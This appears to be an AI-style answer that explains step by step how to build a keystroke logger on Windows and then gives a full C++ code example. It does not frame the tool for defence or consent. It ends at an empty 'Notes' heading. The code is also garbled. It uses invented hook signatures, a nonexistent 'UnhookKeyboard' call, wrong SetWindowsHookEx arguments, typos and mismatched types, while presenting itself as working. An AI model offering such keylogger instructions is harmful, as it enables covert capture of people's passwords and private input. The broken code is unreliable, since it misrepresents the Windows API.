To create a keystroke logger on a Windows computer, follow these steps:

### Step-by-Step Explanation

1. **Include Necessary Headers and Libraries**:
   - Include `Windows.h` and `User32.lib` for Windows API functions.

2. **Define the Keyboard Hook Function**:
   - Use `SetWindowsHook` to set up a keyboard hook. This function returns a handle to the hook, which can be used to attach to the system's keyboard input.

3. **Set Up the Hook**:
   - Use `SetWindowsHook` with `WH_KEYBOARD_LL` to set a low-level keyboard hook for the current thread.

4. **Define the Callback Function**:
   - Create a function `KeyboardCallback` that handles keyboard events. It will be called for each key press and release.

5. **Install the Keyboard Hook**:
   - Use `SetWindowsHookEx` with the callback function and a handle for the current thread.

6. **Handle Key Press and Release Events**:
   - In the callback, check if the event is a key press (`KeyDown`) or release (`KeyUp`). Record the key and modifier states.

7. **Track Modifier Keys**:
   - Use variables to track the previous key state and current state to identify when modifiers like `Shift` or `Ctrl` are pressed or released.

8. **Log Keystrokes**:
   - Append each key press to a log file, including the key character and modifiers if applicable.

9. **Stop the Hook When Done**:
   - Use `UnhookKeyboard` to remove the hook when logging is complete.

10. **Handle Errors**:
    - Check return values of hook functions for errors and handle them appropriately.

### Code Example

```c++
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <ctime>

using namespace std;

static HHOOK keyboardHook = NULL;

// Function prototypes
void KeyboardCallback(int h, int nCode, UINT state, void* hwnd, extraKeyInfo* key);
void InstallKeyboardHook();
void UninstallKeyboardHook();
void LogKeystroke(string key, bool isKeyDown, bool isShift, bool isCtrl);

// Initialize global variables to track key states
static bool isShiftDown = false;
static bool isCtrlDown = false;
static ofstream logFile;
static string logFileName = "keystroke.log";

// Initialize the log file
void InitializeLogFile() {
    logFile.open(logFileName, ios::out | ios::app);
    if (!logFile.is_open()) {
        cerr << "Failed to open log file." << endl;
        return;
    }
}

// Keyboard callback function
void KeyboardCallback(int h, int nCode, UINT state, void* hwnd, extraKeyInfo* key) {
    // Handle key presses
    if (nCode == KEYDOWN) {
        // Record the key stroke
        LogKeystroke(key-> aksks.uChar, true, ((key->keyState & 0x1) != 0), ((key->keyState & 0x2) != 0));
    }
    // Handle key releases
    else if (nCode == KEYUP) {
        // Reset the key states
        isShiftDown = false;
        isCtrlDown = false;
    }
}

// Install the keyboard hook
void InstallKeyboardHook() {
    keyboardHook = SetWindowsHookEx(NULL, KeyboardCallback, 0, &keyBoardCallback, NULL, 0);
    if (keyboardHook == NULL) {
        cout << "Failed to install keyboard hook." << endl;
    } else {
        cout << "Keyboard hook installed." << endl;
        InitializeLogFile();
    }
}

// Uninstall the keyboard hook
void UninstallKeyboardHook() {
    if (keyboardHook) {
        UnhookKeyboard(keyboardHook);
        keyboardHook = NULL;
        cout << "Keyboard hook uninstalled." << endl;
    } else {
        cout << "No keyboard hook installed." << endl;
    }
}

// Log each keystroke
void LogKeystroke(char key, bool isKeyDown, bool shift, bool ctrl) {
    time_t now;
    time(&now);
    char timeStr[20];
    snprintf(timeStr, sizeof(timeStr), "[%d] ", static_cast<int>(now));

    // Determine the key character
    if (isKeyDown) {
        if (shift) {
            if (key == 206 (VK_SHIFT)) {
                // Handle Shift key press
                cout << "Shift pressed" << endl;
            } else {
                // Uppercase and symbols
                key = static_cast<unsigned char>(key);
                if (is alpha(key)) {
                    key = isupper(key) ? toupper(key) : tolower(key);
                }
            }
        } else if (ctrl) {
            // Handle Ctrl key press
            // Example: Start logging here
            cout << "Ctrl pressed" << endl;
        }
    } else {
        // Key released
        if (shift) {
            isShiftDown = false;
            cout << "Shift released" << endl;
        }
        if (ctrl) {
            isCtrlDown = false;
            cout << "Ctrl released" << endl;
        }
    }

    // Append to log file
    logFile << timeStr << key << (isKeyDown ? " (DOWN)" : " (UP)");
    logFile << endl;
}

// Main function
int main() {
    try {
        InstallKeyboardHook();
        while (true) {
            // Keep the program running to capture keystrokes
            Sleep(500);
        }
    } catch (const Exception& e) {
        cerr << "Error: " << e.what() << endl;
    }
    UninstallKeyboardHook();
    return 0;
}
```

### Notes

